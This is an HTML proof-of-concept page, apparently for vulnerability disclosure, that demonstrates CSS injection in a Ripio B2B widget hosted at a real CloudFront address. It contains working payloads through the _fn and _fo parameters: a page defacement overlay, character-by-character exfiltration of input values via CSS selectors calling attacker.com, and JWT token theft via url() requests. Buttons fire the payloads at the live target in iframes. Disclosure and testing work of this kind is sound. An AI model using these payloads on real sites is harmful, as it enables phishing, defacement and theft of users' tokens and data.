<!DOCTYPE html>
<html>
  <head>
    <title>Ripio B2B Widget CSS Injection PoC</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 20px;
        background: #1a1a2e;
        color: #eee;
      }
      .container {
        max-width: 900px;
        margin: 0 auto;
      }
      h1 {
        color: #e94560;
      }
      .payload-box {
        background: #16213e;
        padding: 15px;
        border-radius: 8px;
        margin: 10px 0;
        overflow-x: auto;
      }
      code {
        color: #0f0;
        font-size: 14px;
      }
      .warning {
        background: #e94560;
        color: white;
        padding: 10px;
        border-radius: 5px;
      }
      .success {
        background: #0f0;
        color: black;
        padding: 10px;
        border-radius: 5px;
      }
      iframe {
        width: 100%;
        height: 400px;
        border: 2px solid #e94560;
        border-radius: 8px;
      }
      button {
        background: #e94560;
        color: white;
        border: none;
        padding: 10px 20px;
        cursor: pointer;
        border-radius: 5px;
        margin: 5px;
      }
      button:hover {
        background: #ff6b6b;
      }
      .demo-section {
        margin: 20px 0;
        padding: 20px;
        background: #16213e;
        border-radius: 8px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>ðŸ”´ Ripio B2B Widget - CSS Injection Exploit</h1>

      <div class="warning">
        <strong>VULNERABILITY:</strong> CSS Injection via _fn, _fo, _fd
        parameters<br />
        <strong>TARGET:</strong>
        https://d2pneqdaei3b3x.cloudfront.net/index.html<br />
        <strong>IMPACT:</strong> Data exfiltration, phishing, token theft
      </div>

      <div class="demo-section">
        <h2>1. Basic CSS Injection - Change Background</h2>
        <p>Payload breaks out of font-family and injects arbitrary CSS:</p>
        <div class="payload-box">
          <code>_fn=test';}*{background:red !important}/*&_fo=x</code>
        </div>
        <button onclick="demo1()">Execute Payload</button>
        <br /><br />
        <iframe id="frame1" src="about:blank"></iframe>
      </div>

      <div class="demo-section">
        <h2>2. Phishing Attack - Fake Login Form</h2>
        <p>Inject CSS to overlay fake content:</p>
        <div class="payload-box">
          <code
            >_fn=x';}body::before{content:'HACKED BY
            ATTACKER';position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;font-size:50px;display:flex;align-items:center;justify-content:center;z-index:99999}/*&_fo=y</code
          >
        </div>
        <button onclick="demo2()">Execute Payload</button>
        <br /><br />
        <iframe id="frame2" src="about:blank"></iframe>
      </div>

      <div class="demo-section">
        <h2>3. Data Exfiltration via CSS</h2>
        <p>
          Extract data using CSS attribute selectors (requires attacker server):
        </p>
        <div class="payload-box">
          <code
            >_fn=x';}input[value^="a"]{background:url('https://attacker.com/log?char=a')}input[value^="b"]{background:url('https://attacker.com/log?char=b')}/*&_fo=y</code
          >
        </div>
        <p>
          <em
            >This technique can brute-force extract input values character by
            character.</em
          >
        </p>
      </div>

      <div class="demo-section">
        <h2>4. JWT Token Theft (Combined Attack)</h2>
        <p>When JWT is passed in URL, it leaks via multiple vectors:</p>
        <div class="payload-box">
          <code
            >https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.PAYLOAD&_fn=x';}*{background:url('https://attacker.com/steal?ref=')}/*&_fo=y</code
          >
        </div>
        <p><strong>Token leakage vectors:</strong></p>
        <ul>
          <li>HTTP Referer header to external links</li>
          <li>Browser history</li>
          <li>Server access logs</li>
          <li>CSS url() requests to attacker server</li>
        </ul>
      </div>

      <div class="demo-section">
        <h2>5. Generated CSS Output</h2>
        <p>When payload executes, this CSS is injected:</p>
        <div class="payload-box" id="cssOutput">
          <code
            >@import url('https://fonts.googleapis.com/css2?family=x'); body {
            font-family: '<span style="color: red"
              >x';} *{background:red !important} /*</span
            >', sans-serif;}</code
          >
        </div>
        <p>
          The injected portion (in red) breaks out of the font-family context.
        </p>
      </div>

      <div class="success">
        <strong>PROOF OF CONCEPT COMPLETE</strong><br />
        This demonstrates that user-controlled input is directly interpolated
        into CSS without sanitization, allowing arbitrary style injection.
      </div>
    </div>

    <script>
      const baseUrl = "https://d2pneqdaei3b3x.cloudfront.net/index.html";

      function demo1() {
        const payload = "_fn=test';}*{background:red !important}/*&_fo=x";
        document.getElementById("frame1").src = baseUrl + "?" + payload;
      }

      function demo2() {
        const payload =
          "_fn=x';}body::before{content:'HACKED';position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;font-size:50px;display:flex;align-items:center;justify-content:center;z-index:99999}/*&_fo=y";
        document.getElementById("frame2").src =
          baseUrl + "?" + encodeURI(payload);
      }
    </script>
  </body>
</html>
